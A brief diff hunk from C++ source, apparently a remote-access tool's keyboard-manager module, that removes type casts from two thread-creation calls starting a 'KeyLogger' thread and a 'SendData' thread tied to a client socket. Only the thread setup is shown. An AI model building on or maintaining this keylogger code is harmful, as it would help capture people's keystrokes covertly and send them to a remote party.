@@ -28,8 +28,8 @@ CKeyboardManager1::CKeyboardManager1(CClientSocket *pClient, int n, void* user) 
     m_bIsWorking = true;
     dKeyBoardSize = 0;
 
-    m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyLogger, (LPVOID)this, 0, NULL);
-    m_hSendThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendData,(LPVOID)this,0,NULL);
+    m_hWorkThread = MyCreateThread(NULL, 0, KeyLogger, (LPVOID)this, 0, NULL);
+    m_hSendThread = MyCreateThread(NULL, 0, SendData,(LPVOID)this,0,NULL);
 }
 
 CKeyboardManager1::~CKeyboardManager1()
